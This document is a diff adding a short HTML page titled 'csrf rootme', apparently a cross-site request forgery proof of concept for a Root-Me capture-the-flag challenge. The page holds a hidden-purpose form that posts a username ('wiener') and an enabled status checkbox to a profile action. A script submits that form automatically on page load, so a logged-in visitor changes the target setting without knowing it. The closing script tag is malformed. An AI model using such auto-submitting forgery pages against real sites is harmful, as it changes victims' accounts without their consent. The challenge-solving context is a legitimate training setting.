@@ -1,0 +1,26 @@
+
+
+      
+<html>
+<head>
+<title>csrf rootme</title>
+</head>
+<body>
+<form action="?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="wiener">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" value="on">
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+</form>
+		<script>
+			document.forms[0].submit();
+		<script>
+</body>
+</html>
